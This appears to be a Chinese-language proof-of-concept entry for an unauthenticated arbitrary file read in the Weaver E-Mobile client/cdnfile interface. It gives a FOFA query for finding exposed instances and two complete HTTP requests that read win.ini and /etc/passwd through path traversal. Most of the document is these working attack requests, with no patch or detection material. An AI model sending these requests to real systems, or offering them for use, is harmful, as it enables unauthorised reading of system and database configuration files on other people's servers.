# 泛微E-Mobile系统接口cdnfile存在任意文件读取漏洞

泛微E-Mobile client/cdnfile 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件、数据库配置文件等等。

## fofa

```javascript
app="泛微-EMobile"
```

## poc

```javascript
GET /client/cdnfile/1C/Windows/win.ini?windows HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```

```javascript
GET /client/cdnfile/C/etc/passwd?linux HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```

![image-20240919111430590](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409191114676.png)